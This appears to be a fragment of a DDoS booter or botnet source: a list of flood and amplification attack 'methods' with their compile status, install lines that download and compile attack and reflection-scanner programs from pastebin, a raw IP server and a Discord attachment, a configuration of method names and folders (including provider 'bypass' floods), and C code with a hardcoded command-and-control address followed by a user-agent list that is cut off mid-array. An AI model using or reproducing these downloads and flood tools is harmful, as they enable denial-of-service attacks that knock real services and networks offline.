# BOGUS:     - 0 Error Logs - 0 Warning Logs  || Compile Success!
# RAWUDP:    - 0 Error Logs - 0 Warning Logs  || Compile Success!
# TCP-PSH:   - File can NOT be compiled. just use raw .c file. still works < set permissions and your good to go 
# TCP-RST:   - File can NOT be compiled. just use raw .c file. still works < set permissions and your good to go 
# TCP-XMAS:  - file can NOT be compiled. just use raw .c file. still works < set permissions and your good to go 
# TCP-FIN:   - file can NOT be compiled. just use raw .c file. still works < set permissions and your good to go 
# TCP-ACK:   - file can NOT be compiled. just use raw .c file. still works < set permissions and your good to go 
# UDP_VSE1:  - 0 Error Logs - 0 Warning Logs  || Compile Success!
# UDP_VSE2:  - 0 Error Logs - 0 Warning Logs  || Compile Success!
# EJUNK:     - File is precompiled. set permissions and your good to go
# XANAX:     - File is precompiled. set permissions and your good to go
# FRAG:      - 0 Error Logs - 0 Warning Logs  || Compile Success!
# ARME:      - 0 Error Logs - 0 Warning Logs  || Compile Success!


==================================================
Installs II:
==================================================
Scannable Methods II:
wget -q http://pastebin.com/raw/JV9nCf6U -O dns.c && gcc -o dns dns.c -pthread
wget -q http://pastebin.com/raw/ASH2DYqq -O dnsscan.c && gcc -o dnsscan dnsscan.c -pthread
wget -q http://pastebin.com/raw/7LXZXPWf -O snmp.c && gcc -o snmp snmp.c -pthread
wget -q http://pastebin.com/raw/EtCTaqG1 -O snmpscan.c && gcc -o snmpscan snmpscan.c -pthread
wget -q http://pastebin.com/raw/PNDMd2CF -O db2.c && gcc -o db2 db2.c -pthread
wget -q http://pastebin.com/raw/Fuza6KEM -O db2scan.c && gcc db2scan.c -pthread -lpcap -o db2scan
wget -q http://98.143.148.177/Archive/reprobate/layer4/UDP/Sources/echo/echo.c -O echo.c && gcc -o echo echo.c -pthread
wget -q http://98.143.148.177/Archive/reprobate/layer4/UDP/Sources/echo/echoscan.c -O echoscan.c && gcc echoscan.c -pthread -lpcap -o echoscan
wget -q http://98.143.148.177/Archive/reprobate/layer4/UDP/Sources/mdns/mdns.c -O mdns.c && gcc -o mdns mdns.c -pthread
wget -q http://98.143.148.177/Archive/reprobate/layer4/UDP/Sources/mdns/mdnsscan.c -O mdnsscan.c && gcc -o mdnsscan mdnsscan.c -pthread
wget -q http://98.143.148.177/Archive/reprobate/layer4/UDP/Sources/memcache/memcache -O memcache && chmod 777 memcache
wget -q http://98.143.148.177/Archive/reprobate/layer4/UDP/Sources/memcache/memcachescan -O memcachescan && chmod 777 memcachescan
wget -q http://98.143.148.177/Archive/reprobate/layer4/UDP/Sources/rip/rip.c -O rip.c && gcc -o rip rip.c -pthread
wget -q http://98.143.148.177/Archive/reprobate/layer4/UDP/Sources/rip/ripscan.c -O ripscan.c && gcc -o ripscan ripscan.c -pthread
wget -q http://98.143.148.177/Archive/reprobate/layer4/UDP/Sources/reaper/reaper.c -O reaper.c && gcc -o reaper reaperscan.c -pthread
wget -q http://98.143.148.177/Archive/reprobate/layer4/UDP/Sources/reaper/reaperscan.c -O reaperscan.c && gcc -o reaperscan reaperscan.c -pthread
wget -q http://98.143.148.177/Archive/reprobate/layer4/UDP/Sources/heartbeat/heartbeat.c -O heartbeat.c && gcc -o heartbeat heartbeat.c -pthread
wget -q http://98.143.148.177/Archive/reprobate/layer4/UDP/Sources/heartbeat/heartbeatscan.c -O heartbeatscan.c && gcc -o heartbeatscan heartbeatscan.c -pthread
==================================================
Extra Methods III: 
wget -q http://98.143.148.177/Archive/reprobate/layer4/TCP/Precompiled/grenade -O grenade && chmod 777 grenade
wget -q http://98.143.148.177/Archive/reprobate/layer4/TCP/Collections/Other_Collection/zap.c -O zap.c && gcc -o zap zap.c -pthread
wget -q http://98.143.148.177/Archive/reprobate/layer4/TCP/Collections/Other_Collection/wizard.c -O wizard.c && gcc -o wizard wizard.c -pthread
wget -q http://98.143.148.177/Archive/reprobate/layer4/TCP/Sources/bogus.c -O bogus.c && gcc -o bogus bogus.c -pthread
wget -q http://98.143.148.177/Archive/reprobate/layer4/UDP/Raw_Collection/rawudp.c -O rawudp.c && gcc -o rawudp rawudp.c -pthread
==================================================
TCP Collection:
wget -q http://98.143.148.177/Archive/reprobate/layer4/TCP/Collections/tcp_collection/tcp-psh.c -O tcp-psh.c && chmod 777 tcp-psh.c
wget -q http://98.143.148.177/Archive/reprobate/layer4/TCP/Collections/tcp_collection/tcp-rst.c -O tcp-rst.c && chmod 777 tcp-rst.c
wget -q http://98.143.148.177/Archive/reprobate/layer4/TCP/Collections/tcp_collection/tcp-fin.c -O tcp-fin.c && chmod 777 tcp-fin.c
wget -q http://98.143.148.177/Archive/reprobate/layer4/TCP/Collections/tcp_collection/tcp-ack.c -O tcp-ack.c && chmod 777 tcp-ack.c
wget -q http://98.143.148.177/Archive/reprobate/layer4/TCP/Collections/tcp_collection/tcp-xmas.c -O tcp-xmas.c && chmod 777 tcp-xmas.c
==================================================
Extra Methods IV:
wget -q http://98.143.148.177/Archive/reprobate/layer4/UDP/Raw_Collection/UDP_VSE2.c -O UDP_VSE2.c && gcc -o UDP_VSE2 UDP_VSE2.c -pthread
wget -q http://98.143.148.177/Archive/reprobate/layer4/UDP/Raw_Collection/UDP_VSE.c -O UDP_VSE.c && gcc -o UDP_VSE UDP_VSE.c -pthread
wget -q http://98.143.148.177/Archive/reprobate/layer4/TCP/Precompiled/ejunk -O ejunk && chmod 777 ejunk
wget -q http://98.143.148.177/Archive/reprobate/layer4/TCP/Precompiled/xanax -O xanax && chmod 777 xanax
wget -q http://98.143.148.177/Archive/reprobate/layer4/TCP/Sources/frag.c -O frag.c && gcc -o frag frag.c -pthread
==================================================
layer 7 methods
wget -q https://cdn.discordapp.com/attachments/564177458631409694/580871213316964373/bypass.js -O omega.js
wget -q http://98.143.148.177/Archive/reprobate/layer7/Sources/arme.c -O arme.c && gcc -o arme arme.c -pthread


#================================================#
TotalmethodsIPHM = "62"
#================================================#
# V1 Methods
ScannedMethods = ["ldap", "ntp", "tftp", "ssdp", "portmap", "chargen", "sentinel", "netbios", "mssql", "ts3"]
Extramethods = ["vse", "telnet", "tcp-abuse", "udp-abuse", "dominate"]
bypassmethods = ["ovhbypass", "cfbypass", "nfobypass", "bo4bypass"]
vipmethods = ["hun-fun", "ass-crk", "eft-pwr", "pmp-pmp",]
extramethods = ["essyn", "csyn", "xsyn", "zsyn", "issyn"]
servermethods = ["winsyn", "winseqid", "yubina", "prowin"]
totalv1methods = "33"
#================================================#
# v1 Directories
#================================================#
# Scanned / reflection Based methods
#================================================#
reflection = "amp/methods/layer4/v1/reflection/"
bandwidth = "amp/methods/layer4/v1/bandwidth/"
ldap = "amp/methods/layer4/v1/reflection/ldap/"
ssdp = "amp/methods/layer4/v1/reflection/ssdp/"
ntp = "amp/methods/layer4/v1/reflection/ntp/"
tftp = "amp/methods/layer4/v1/reflection/tftp/"
portmap = "amp/methods/layer4/v1/reflection/portmap/"
sentinel = "amp/methods/layer4/v1/reflection/sentinel/"
chargen = "amp/methods/layer4/v1/reflection/chargen/"
mssql = "amp/methods/layer4/v1/reflection/mssql/"
ts3 = "amp/methods/layer4/v1/reflection/ts3/"
netbios = "amp/methods/layer4/v1/reflection/netbios/"
#================================================#
# Yubina Collection / bandwidth Based Methods
#================================================#
prowin = "amp/methods/layer4/v1/bandwidth/yubinacollection/"
yubina = "amp/methods/layer4/v1/bandwidth/yubinacollection/"
winseqid = "amp/methods/layer4/v1/bandwidth/yubinacollection/"
winsyn = "amp/methods/layer4/v1/bandwidth/yubinacollection/"
#================================================#
# Yubina Collection / bandwidth Based Methods
#================================================#
ovhbypass = "amp/methods/layer4/v1/bandwidth/bypasses/"
nfobypass = "amp/methods/layer4/v1/bandwidth/bypasses/"
cfbypass = "amp/methods/layer4/v1/bandwidth/bypasses/"
bo4bypass = "amp/methods/layer4/v1/bandwidth/bypasses/"
#================================================#
# Custom Methods / bandwidth / reflection based methods
#================================================#
hunfun = "amp/methods/layer4/v1/custom/hun-fun"
pmppmp = "amp/methods/layer4/v1/custom/pmp-pmp"
asscrk = "amp/methods/layer4/v1/custom/ass-crk"
eftpwr = "amp/methods/layer4/v1/custom/eft-pwr"
#================================================#
# Other methods / bandwidth Based methods
#================================================#
vse = "amp/methods/layer4/v1/bandwidth/other/"
telnet = "amp/methods/layer4/v1/bandwidth/other/"
dominate = "amp/methods/layer4/v1/bandwidth/other/"
udpabuse = "amp/methods/layer4/v1/bandwidth/other/"
tcpabuse = "amp/methods/layer4/v1/bandwidth/other/"
csyn = "amp/methods/layer4/v1/bandwidth/other/"
xsyn = "amp/methods/layer4/v1/bandwidth/other/"
zsyn = "amp/methods/layer4/v1/bandwidth/other/"
essyn = "amp/methods/layer4/v1/bandwidth/other/"
issyn = "amp/methods/layer4/v1/bandwidth/other/"
#================================================#
# v2 methods
#================================================#
ScannedMethodsII = ["dns", "mdns", "db2", "echo", "snmp", "memcache", "rip", "reaper", "heartbeat"]
TCPCollection = ["tcp-psh", "tcp-rst", "tcp-fin", "tcp-xmas", "tcp-ack"]
ExtraMethodsIII = ["grenade", "zap", "rawudp", "bogus", "wizard"]
VIPMethodsII = ["msqdnm", "tfdnp", "lndp", "ardmsp"]
ExtraMethodsIV = ["udp_vse1", "udp_vse2", "ejunk", "xanax", "frag"]
totalv2methods = "29"
#================================================#
# v2 Directories
#================================================#
#================================================#
# Scanned / reflection Based methods
#================================================#
dns = "amp/methods/layer4/v2/reflection/dns/"
snmp = "amp/methods/layer4/v2/reflection/snmp/"
db2 = "amp/methods/layer4/v2/reflection/db2/"
echo = "amp/methods/layer4/v2/reflection/echo/"
mdns = "amp/methods/layer4/v2/reflection/mdns/"
memcache = "amp/methods/layer4/v2/reflection/memcache/"
rip = "amp/methods/layer4/v2/reflection/rip/"
reaper = "amp/methods/layer4/v2/reflection/reaper/"
heartbeat = "amp/methods/layer4/v2/reflection/heartbeat/"
arcmethod = "amp/methods/layer4/v2/reflection/"
#================================================#
# Other methods / bandwidth based methods
#================================================#
zap = "amp/methods/layer4/v2/bandwidth/other/"
wizard = "amp/methods/layer4/v2/bandwidth/other/"
bogus = "amp/methods/layer4/v2/bandwidth/other/"
rawudp = "amp/methods/layer4/v2/bandwidth/other/"
udpvse1 = "amp/methods/layer4/v2/bandwidth/other/"
udpvse2 = "amp/methods/layer4/v2/bandwidth/other/"
grenade = "amp/methods/layer4/v2/bandwidth/other/"
xanax = "amp/methods/layer4/v2/bandwidth/other/"
frag = "amp/methods/layer4/v2/bandwidth/other/"
ejunk = "amp/methods/layer4/v2/bandwidth/other/"
#================================================#
# Layer 7 methods
#================================================#
omega = "amp/methods/layer7/v2/"
arme = "amp/methods/layer7/v2/"
#================================================#
# tcp-collection methods / bandwidth based methods
#================================================#
tcppsh = "amp/methods/layer4/v2/bandwidth/tcpcollection/"
tcpfin = "amp/methods/layer4/v2/bandwidth/tcpcollection/"
tcpxmas = "amp/methods/layer4/v2/bandwidth/tcpcollection/"
tcprst = "amp/methods/layer4/v2/bandwidth/tcpcollection/"
tcpack = "amp/methods/layer4/v2/bandwidth/tcpcollection/"
#================================================#
# V1 Directory Listings
#================================================#
# Methods that go into amp/methods/layer4/v1/bandwidth/yubinacollection/ directory
# prowin, yubina, winseqid, winsyn
#================================================#
# Methods that go into amp/methods/layer4/v1/bandwidth/bypasses/ Directory
# ovhbypass, nfobypass, bo4bypass
#================================================#
# Methods that go into amp/methods/layer7/v1/
# cfbypass
#================================================#
# Methods that go into  amp/methods/layer4/v1/bandwidth/extra/ folder
# vse, telnet, dominate, udp_abuse, tcp-abuse
#================================================#
# Methods that go into /custom/ directories
# amp/methods/layer4/v1/custom/hun-fun || amp/methods/layer4/custom/pmp-pmp 
# amp/methods/layer4/v1/custom/zch-cri || amp/methods/layer4/custom/ass-crk ||  amp/methods/layer4/custom/eft-pwr
#================================================#
# v2 Directory Listing
#================================================#
# methods that go into amp/methods/layer4/v2/reflection/
# dns, snmp, db2, echo, mdns, memcache, rip, reaper, heartbeat, arc-method
#================================================#
# Methods that go inside amp/methods/layer4/v2/bandwidth/other
# zap, wizard, bogus, rawudp, udp_vse1, udp_vse2, grenade, xanax, frag
#================================================#
# Methods that go into amp/methods/layer4/bandwidth/tcpcollection/ directory
# tcp-psh.c tcp-fin.c tcp-ack.c tcp-rst.c tcp-xmas.c
#================================================#
# Methods that go into amp/methods/layer7/v2/
# omega, arme  
























 */

unsigned char *commServer[] = {"45.95.169.190:7788"};

const char *useragents[] = {
"Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15G77",
"Mozilla/5.0 (iPad; CPU OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Safari/605.1.15",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/605.1.15 (KHTML, like Gecko)",
"Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (iPad; CPU OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
"Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36",
"Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
"FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
"TheSuBot/0.2 (www.thesubot.de)",
"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16",
"BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201",
"FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
"zspider/0.9-dev http://feedback.redkolibri.com/",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)",
"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspider+(+http://www.baidu.com/search/spider.htm)",
"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7",
"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15",
"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0",
"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3)",
"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",  
"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60",
"Mozilla/5.0 (iPad; U; CPU OS 5_1 like Mac OS X) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10 UCBrowser/3.4.3.532",
"Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0",
"Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; cn) Opera 11.00",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.6.01001)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.7.01001)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.5.01003)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.01", 
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
"Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1",
"Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1",//Jays Phone
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
	"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
	"Mozilla/5.0 (Windows NT 6.1; rv:13.0) Gecko/20100101 Firefox/13.0.1",
	"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
	"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
	"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
	"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
	"Mozilla/5.0 (Linux; U; Android 2.2; fr-fr; Desire_A8181 Build/FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:13.0) Gecko/20100101 Firefox/13.0.1",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3",
	"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6",
	"Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; PeoplePal 6.2)",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
	"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11",
	"Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
	"Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02",
	"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:5.0) Gecko/20100101 Firefox/5.0",
	"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
	"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 3.5.30729)",
	"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:13.0) Gecko/20100101 Firefox/13.0.1",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",
	"Mozilla/5.0 (Windows NT 6.1; rv:2.0b7pre) Gecko/20100921 Firefox/4.0b7pre",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
	"Mozilla/5.0 (Windows NT 5.1; rv:12.0) Gecko/20100101 Firefox/12.0",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
	"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20100101 Firefox/12.0",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; MRA 5.8 (build 4157); .NET CLR 2.0.50727; AskTbPTV/5.11.3.15590)",
	"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:13.0) Gecko/20100101 Firefox/13.0.1",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.5 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.4",
	"Mozilla/5.0 (Windows NT 6.0; rv:13.0) Gecko/20100101 Firefox/13.0.1",
	"Mozilla/5.0 (Windows NT 6.0; rv:13.0) Gecko/20100101 Firefox/13.0.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
    "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36",
    "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
    "Doris/1.15 [en] (Symbian)",
	"PSP (PlayStation Portable); 2.00",
	"Bunjalloo/0.7.6(Nintendo DS;U;en)",
	"Mozilla/5.0 (Windows NT 10.0; Win64)",
	"Mozilla/5.0 (Windows NT 6.1; Win64)",
	"Mozilla/4.0 (PSP (PlayStation Portable); 2.00)",
	"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1",
	"Opera/9.80 (Windows NT 5.1; U;) Presto/2.7.62 Version/11.01",
	"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16",
	"BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100",
	"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36",	
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) Version/10.0 Mobile/14F89 Safari/602.1 ",
	"Mozilla/5.0 (Linux; Android 5.0.2; HTCONE Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36 ",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36 ",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393 ",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) Mobile/14F89",
	"Mozilla/5.0 (Windows NT 10.0; Trident/7.0; Touch; rv:11.0) like Gecko",
	"Mozilla/5.0 (Linux; Android 7.1.2; Nexus 5X Build/N2G47Z) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
	"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0 ",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 ",
